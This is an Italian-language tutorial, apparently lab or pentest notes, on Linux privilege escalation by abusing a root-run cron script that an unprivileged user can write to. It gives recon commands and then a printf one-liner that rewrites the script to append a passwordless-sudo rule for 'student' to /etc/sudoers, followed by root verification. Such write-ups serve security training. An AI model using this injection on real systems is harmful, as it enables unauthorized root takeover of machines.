# Exploiting Cron Jobs – Privilege Escalation via Misconfigurazioni

**Cron** è un demone di sistema su Linux che consente la pianificazione automatica di comandi, script o processi secondo una tempistica definita. <br>
Queste pianificazioni sono conosciute come **Cron Jobs**, e sono ampiamente utilizzate dagli amministratori per automatizzare operazioni di routine come backup, aggiornamenti o pulizie periodiche del sistema.

---

## 1 – Comprendere la Vulnerabilità

La potenziale falla nella sicurezza nasce quando uno script pianificato da **root** (quindi eseguito con privilegi massimi) è modificabile da altri utenti. <br>
In questi casi, un utente non privilegiato può **inserire comandi arbitrari** nello script e attendere che venga eseguito automaticamente dal sistema con permessi root. <br>
Questo scenario è particolarmente sfruttabile in ambienti server, dove gli amministratori fanno largo uso di cron per automatizzare attività.

---

## 2 – Ricognizione: Identificare i Cron Job Vulnerabili

Dopo aver ottenuto una shell sul sistema target con un utente non privilegiato:

```bash
whoami               # visualizza l’utente attuale
id o groups <nome>   # visualizza i gruppi a cui l’utente appartiene
```

Per identificare i cron job attivi:

```bash
crontab -l           # visualizza i cron job dell’utente corrente
ls -la /etc/cron*    # ispeziona i cron job globali o di sistema
```
<br>
Se troviamo un file creato dall'utente root ma di cui non abbiamo permessi, possiamo vedere se troviamo dei rifetimenti a quel file dentro qualche script o qualche file che possiamo leggere, modificare o eseguire:

```bash
grep -rnw /usr -e "/home/student/file"
```
- `r` sta per ricorsivo, quindi grep esplora tutte le sottodirectory della directory `/usr` specificata
- `-n` fa sì che grep mostri anche il numero di riga in cui trova la stringa.
- `-w` fa in modo che grep trovi solo corrispondenze esatte di parole intere. Questo vuol dire che non troverà /home/student/fileX o /home/student/file_bak, ma solo /home/student/file come stringa completa
- `usr` é la directory di partenza quindi verranno cercate corrispondenze partendo da quella directory
- `-e`  serve a specificare la stringa esatta che si vuole trovare

Controlla i permessi con:

```bash
ls -la <pathFile.sh>
```

Se uno script schedulato da root è **scrivibile dal nostro utente**, possiamo modificarlo per ottenere privilegi più elevati.

---

## 3 – Iniezione di Comandi per Privilege Escalation

se il file vulnerabile è modificabile e non abbiamo editor come `nano` o `vim`, possiamo utilizzare:

```bash
printf '#!/bin/bash\necho "student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /path/del/file.sh
```

- `printf` stampa la stringa successiva
- `#!/bin/bash\necho "student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers` é lo script che vogliamo inserire dentro al file .sh che verrá esegtuito dal CronJob
- `>` sovrascrive completamente il file indicato successivamente
- `file.sh` è il file che verrá eseguito da CronJob e che vogliamo modificare


lo script che abbiamo indicato aggiunge una nuova entry al file `/etc/sudoers` (`>>` append/aggiungi alla fine), che concede all'utente `student` il permesso di eseguire qualsiasi comando come qualsiasi utente (incluso root), senza dover fornire la password (`ALL=(ALL) NOPASSWD:ALL`).


Dopo l’esecuzione del cron job, se il comando è andato a buon fine:

```bash
sudo -l
```

Il sistema restituirá un output simile a questo:
```
User student may run the following comands on <...>: 
	(root) NOPASSWD: /etc/init.d/cron
	(root) NOPASSWD: ALL
```

Allora possiamo eseguire comandi come root senza password:

```bash
sudo su
whoami
```

> Output previsto: `root`

Ora abbiamo controllo completo sul sistema e possiamo ispezionare tutti i cron job esistenti, incluso quello che ci ha garantito l’accesso:

```bash
crontab -l
```

---
